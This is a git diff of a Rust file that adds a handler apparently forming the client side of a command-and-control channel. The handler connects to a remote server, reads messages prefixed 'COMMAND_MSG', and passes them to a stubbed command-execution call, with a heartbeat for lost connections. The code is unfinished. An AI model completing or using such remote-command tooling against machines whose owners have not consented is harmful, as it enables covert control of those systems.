@@ -4,7 +4,7 @@
     2) The heartbeat function
 */
 
-use super::{ps_functions, messages};
+use super::{ps_functions, messages, command_wrapper};
 use std::io::{Read, Write};
 mod connection_helper;
 
@@ -142,7 +142,7 @@ pub async fn heartbeat(sock_addr: std::net::SocketAddr, call_reason: &str) -> st
     // Maybe later I will update it to be able to reconnect with the server from the point it missed the connection
     match call_reason {
         messages::HEARTBEAT_NO_ACTION => messages::HEARTBEAT_NO_ACTION,
-        _ => messages::MISCONNECTION_OR_COMMUNICATION
+        _ => messages::MISCONNECTION_OR_MISCOMMUNICATION
     };
 
 
@@ -167,9 +167,52 @@ pub async fn heartbeat(sock_addr: std::net::SocketAddr, call_reason: &str) -> st
 }
 
 // This is the function that will handle the commands sending and receiving communication
-pub async fn commands_communication_handler(server_addr: &str, server_port: &str, commands_secret: &str, nonce: &str) {
+pub async fn commands_communication_handler(server_addr: &str, server_port: &str, commands_secret: &str, nonce: &str) -> std::io::Result<()> {
 
-    let sock_address: std::net::SocketAddr = convert_ip_port_to_sockaddr(server_addr, server_port);
+    // Times vars // Make 30000
+    let time_before_heartbeat_ms: u64 = 3000;
+    let duration_before_heartbeat: std::time::Duration = std::time::Duration::from_millis(time_before_heartbeat_ms);
+
+    // Temp Buffer (TODO Change later)
+    let mut buffer: [u8; 8192]   = [0; 8192];
+
+    let com_sock_addr: std::net::SocketAddr = convert_ip_port_to_sockaddr(server_addr, server_port);
+
+
+    match std::net::TcpStream::connect_timeout(&com_sock_addr, duration_before_heartbeat) {
+        
+        Err(e) => {
+            
+            println!("[!] Timeout: Could not initilize the command communication: {}", e);
+            heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+        },
+        Ok(mut commands_stream) => {
+
+            commands_stream.set_write_timeout(Some(duration_before_heartbeat))?;
+            commands_stream.set_read_timeout(Some(duration_before_heartbeat))?;
+
+            match commands_stream.read(&mut buffer) {
+
+                Ok(command_data) if command_data > 0 => {
+
+                    let server_command: std::borrow::Cow<'_, str> = String::from_utf8_lossy(&buffer[..command_data]);
+                    // If the command message uses the correct form: COMMAND_MSG:
+                    if server_command.to_string().starts_with(std::str::from_utf8(messages::COMMAND_MSG).unwrap()) {
+
+                        // Decrypt the command
+                        
+                        command_wrapper::excute_server_command()
+                    }
+                },
+                Ok(_) => {},
+                Err(e) => {
+
+                    println!("[-] Error: cannot read the server command {}", e);
+                    heartbeat(com_sock_addr, messages::MISCONNECTION_OR_MISCOMMUNICATION).await?;
+                }
+            }
+        }
+    }
 
     /*
     println!("{}", sock_address);
@@ -193,4 +236,6 @@ pub async fn commands_communication_handler(server_addr: &str, server_port: &str
     // TDOD
     println!("THis is command handler");
     */
+
+    Ok(())
 }
